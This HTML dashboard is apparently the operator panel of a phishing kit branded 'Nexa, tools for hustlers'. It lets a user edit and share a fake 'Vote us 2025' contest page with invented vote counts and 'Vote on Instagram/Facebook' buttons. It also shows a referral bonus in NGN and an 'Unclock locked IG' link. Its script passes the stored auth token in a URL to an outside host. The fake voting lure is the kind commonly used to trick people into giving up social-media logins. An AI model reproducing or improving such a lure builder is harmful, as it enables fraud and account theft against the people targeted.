<!DOCTYPE html>
<html>
<head>
   <meta charset="UTF-8">
   <meta name="viewport"
      content="width=device-width, initial-scale=1">
   <title>CCTV dashboard</title>
     <script src="https://kit.fontawesome.com/df4806f026.js" crossorigin="anonymous"></script>
  <link rel="preconnect" href="https://fonts.googleapis.com">
  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
  <link href="https://fonts.googleapis.com/css2?family=Poppins:ital,wght@0,100;0,200;0,300;0,400;0,500;0,600;0,700;0,800;0,900;1,100;1,200;1,300;1,400;1,500;1,600;1,700;1,800;1,900&display=swap" rel="stylesheet"> 

  <!-- SEO Meta -->
  <meta name="author" content="Nexa">
  <meta name="keywords" content="Nexa, tools for hustlers" />
  <meta name="theme-color" content="#000">

  <!-- Favicon & PWA Icons -->
<link rel="icon" type="image/svg" href="assets/icons/Nexa-logo.svg" sizes="150x160" />
<link rel="icon" type="image/svg+xml" href="assets/icons/Nexa-logo.svg" />
<link rel="shortcut icon" href="assets/icons/Nexa-logo.svg" />
<link rel="apple-touch-icon" sizes="180x180" href="assets/icons/Nexa-logo.svg" />
<meta name="apple-mobile-web-app-title" content="Nexa" />
<link rel="manifest" href="assets/icons/site.webmanifest" />
<script src="js/main.js" type="module"></script>
<script src="js/dashboard.js"type="module"></script>

    <link rel="stylesheet" href="assets/admin/global.css">
    <link rel="stylesheet" href="assets/css/panel.css">
    <link rel="stylesheet" href="assets/css/proj.css">
<style>
    /* small helpers so the pages toggle cleanly */
    .page { display: none; padding: 16px; }
    .page.active { display: block; }
    .nav.active { font-weight: 700;
    background: #ccc;
    
      
    }
    .nav{
       font-size :0.8rem;
       padding: 1rem;
    }
    .student-card { border: 1px solid #eee; padding: 12px; margin: 8px 0; border-radius: 6px; }
    .muted { color: #666; font-size: .9rem; }
    .small { font-size: .85rem; }
    
    
    .modal-container {
  position: fixed;
  top: 0;
  left: 0;
  width: 100%;
  height: 100vh;
  background: #666;
  display: flex;
  justify-content: center;
  align-items: center;
  z-index: 9999;
  padding:1rem;
  flex-direction:column;
  cursor: not-allowed;
  pointer-events: none;
}

.modal-box {
  background: #fff;
  border-radius: 10px;
  padding: 2rem;
  
  max-width: 400px;
  width: 90%;
  box-shadow: 0 5px 15px rgba(0,0,0,0.3);
}

.modal-title {
  font-size: 1.5rem;
  margin-bottom: 1rem;
}

.modal-desc {
  font-size: 1rem;
  margin-bottom: 1.5rem;
}

.modal-buttons {
  display: flex;
  justify-content: flex-end;
  gap: 0.5rem;
}

.modal-btn {
  padding: 0.5rem 1rem;
  border: none;
  border-radius: 5px;
  cursor: pointer;
}
  </style>
  
</head>

<body>
      
 <main>
   <section id="home" class=" page active card-container">
      

   <header class=" dashboard-header">
         <div class="profile-container ">
    <div class="flex ">
     <span class="image">
          <img src="" alt="user profile "class="avata avata-sm avata-1" />
     </span>
     <span>
       <strong class="admin-username name"id="admin-name">
        User
       </strong>
       <p class="text username">
          Welcome to cctv admin panel 
       </p>
     </span>
   </div>
   
   <div>
     <label for="avatarInput">
      <button class="sec-btn btn btn-sm edit" id="edit-prifile">
         <span class="fas fa-pencil"></span>
      
      </button>
   </label>
   </div>
   </div> 
</header>


<div id=""class="dashboard">

   <div class="grid stats">
  
     
     <div class="item">
        <h4 class="stats-title grand">
           Referral bonus:
        </h4>
        <p class="vote-details details">
          NGN 0
        </p>
     </div>
     <input type="hidden" name="inv-link"id="inv-link"value="">
     <div class="item">
      <button class="btn main-btn p-03"data-role="copy"data-target="inv-link">
        <span class="fas fa-users"></span> Invite users
      </button>
     </div>
   </div>
   <div class="frsb">



  <div>
   <input type="hidden" name="" id="ref-link" value="" />

  </div>
   </div>
</div>

      
       <div class="max-card-header frsbt my-1">
          <h4 class="muted grand">Working tools</h4>
          <div>
                 </div>
       </div>
       <!---All available tools--->
<div class="work-tools">
          
  <!---VOTING SITE--->
  <!---Edit mode--->
<div class="vote-site project preview-mode"id="vote-site">
  <form class=" edit"id="vote-site-settings">
  <div class="p-card-header">
    <span class="fas fa-language"></span> 
    English (UK)
    <span class="fas fa-chevron-down"></span>
  </div>
  <div class="p-card">
    <div class="card-content">
      <div>
        <img src="https://res.cloudinary.com/diiaihfac/image/upload/v1763153516/nexa_mini/qbl31btpwysn0tlgv8ff.jpg" alt=""class="vote-card-bg-img">
      
          <textarea class="p-card-title"name="title">
              The People's pick  
          </textarea>
          
      </div>
      <div class="card-text">
      <div class="p-card-profile">
        <div>
          <img src="assets/check-mark.png" alt=""/>
        </div>
        <div>
         <textarea class="p-card-sub-title"name="subTitle">
   Vote us 2025 üèÖüèÖüéäüéâüéä
      </textarea>
        <small class="vote-count"> 9000 votes #8</small>
        </div>
      </div>
      <div>
           <textarea name="description" id= rows="48" cols="33"class="p-card-desc">
             I need your support! Please take a moment to cast your vote and help me reach new heights in this competition. <strong>Your vote</strong> could be the difference-maker, propelling me toward <b>victory</b>
           </textarea>
      </div>
    </div>
    </div>
        <div class="button-con">
      <button type="button"class="p-main-btn"disabled>
        <span class="fa-brands fa-instagram fa-sm"></span>  
        Vote on Instagram 
        
      </button>
      
    </div>
  </div>
  <div class="action-btn-con">
        <button type="submit"class="btn-sm main-btn btn">
          Save changes
        </button>
  </div>
</form>
       <!---Preview mode--->
<div class=" preview">
  <div class="p-card-header">
    <span class="fas fa-language"></span> 
    English (UK)
    <span class="fas fa-chevron-down"></span>
  </div>
  <div class="p-card">
    <div class="card-content">
      <div>
        <img src="https://res.cloudinary.com/diiaihfac/image/upload/v1763153516/nexa_mini/qbl31btpwysn0tlgv8ff.jpg" alt=""class="vote-card-bg-img">
        <h2 class="p-card-title"name="title">
          The People's pick
        </h2>
      </div>
      <div class="card-text">
      <div class="p-card-profile">
        <div>
          <img src="/frontend /assets/check-mark.png" alt=""/>
        </div>
        <div>
         <h3 class="p-card-sub-title"name="subTitle">
   Vote us 2025 üèÖüèÖüéäüéâüéä
      </h3>
        <small class="vote-count"> 9000 votes #8</small>
        </div>
      </div>
      <div>
           <p name="description" id= rows="40" cols="35"class="p-card-desc">
             I need your support! Please take a moment to cast your vote and help me reach new heights in this competition. <strong>Your vote</strong> could be the difference-maker, propelling me toward victory
           </p>
      </div>
    </div>
    </div>
        <div class="button-con">
      <button type="button"class="p-main-btn"disabled>
        <span class="fa-brands fa-instagram"></span>  
        Vote on Instagram 
        
      </button>
      
       <button type="button"class="p-main-btn"disabled>
        <span class="fa-brands fa-facebook"></span>  
        Vote on Facebook 
      </button>
    </div>
  </div>
  <div class="action-btn-con">
  <button type="button"data-role="edit"data-target="#vote-site"class="btn sec-btn btn-sm">
    Edit
  </button>
  <button class="btn btn-sm main-btn" type="button"data-role="copy"data-target="ref-link">
   <span class="fas fa-copy"></span>
    Copy link
  </button>
  </div>

 </div>
</div>

<div class="frsb">

      <button type="button"class="btn main-btn p4 btn-sm"data-role="link"data-target=""id="help-link">
      <span class="fab fa-instagram"></span>
Unclock locked IG
  </button>
  
</div>
</div>

      
      
  <div id="recent-visitors"></div>
</section>


<!---Main profile--->
<section id="profile" class="page ">
<div class="page-info">
    <span class="fas fa-lg fa-nav fa-arrow-left"></span>
  <span class="page-name">Profile</span>
</div>
  <div id="feedback">
    
  </div>

  <div class="max-card card profie-container">
    <div class="profile-data">
      <div class="avata-container">
        <img src="" alt="my profile" class="avata avata-4"id="main-profile"/>
       <form id="avatarForm">
  <input type="file" id="avatarInput" accept="image/*" class="hidden"/>
  <label for="avatarInput">
    <span class="fas fa-camera edit-avata"></span>
  </label>
    <button type="submit"id="save-avata" class="main-btn">Save Image</button>
      </form>
      </div>
    </div>
    
    <div class="user-details">
      <div class="name">
        
      </div>
      <span class="username"></span>
    </div>
  </div>
</section>

    
   <div class="lifter">
      
   </div>
   <footer>
      <ul id="main-nav">
         <li class="nav active"data-role="nav"data-target="home">
            <span class="fas fa-home">
            </span> Home
            </li>
         <li class="nav"data-role="nav"data-target="marketplace">
            <span class="fas fa-shopping-bag "></span>
         Stores 
         </li>
         <li class="nav"data-role="nav"data-target="referrals">
            <span class="fas fa-users"></span>
            Referrals 
            </li>
         <li class="nav"data-role="nav"data-target="profile">
            <img src=""class="avata avata-1" alt="" />
            </li>
      </ul>
   </footer>
  <script type="module" src="assets/js/main.js"></script>

 <script type="module">
 const admin = JSON.parse(localStorage.getItem("nexa_token"));
 let referralCode = admin;
 
 
 const helpCenterEdit = 
 document.getElementById("help-center-edit");
 const lin = 
 document.getElementById("help-link");
 
 
 lin.addEventListener("click",(e) =>{
   lin.disabled = true;
   lin.innerHTML = "Please wait...";
   window.location.href= `https://help-center-self-six.vercel.app/adminHelp.html?ref=${referralCode}`;

 })
    

const avatarForm = document.getElementById("avatarForm");
const avatarInput = document.getElementById("avatarInput");
const currentAvatar = document.querySelectorAll(".avata");
const preview = document.querySelector("#preview");
const save = avatarForm.querySelector("[type=submit]");
save.disabled = true;
// Detect file selection and show preview
avatarInput.addEventListener("change", (e) => {
  const file = e.target.files[0];
  if (!file) return console.log("No avatar selected");


save.disabled = false;
  // Show preview
  const reader = new FileReader();
  reader.onload = (event) => {
 if(preview)   preview.src = event.target.result;
  };
  reader.readAsDataURL(file);


});
const o = save.textContent;
// Handle avatar upload
avatarForm.addEventListener("submit", async (e) => {
  e.preventDefault();
save.textContent = "Updating avatar..."
  const file = avatarInput.files[0];
  if (!file) return alert("Select a file first");

  const formData = new FormData();
  formData.append("avatar", file);

  try {
    const token = JSON.parse(localStorage.getItem("nexa_token"));
    const res = await fetch("https://prosper-cub-1.onrender.com/admin/avatar", {
      method: "POST",
      headers: { Authorization: "Bearer " + token },
      body: formData
    });

    const data = await res.json();

    if (data.success) {
      currentAvatar.forEach(a => a.src = data.avatar); // update all avatars
      localStorage.setItem("avatar", data.avatar);     // save to localStorage
      
    } else {
      alert("Error: " + data.error);
    }
  } catch (err) {
    console.error(err);
    alert("Something went wrong while uploading.");
  }finally{
    save.textContent = o;
    save.disabled = true;
  
  }
});
</script>
</body>

</html>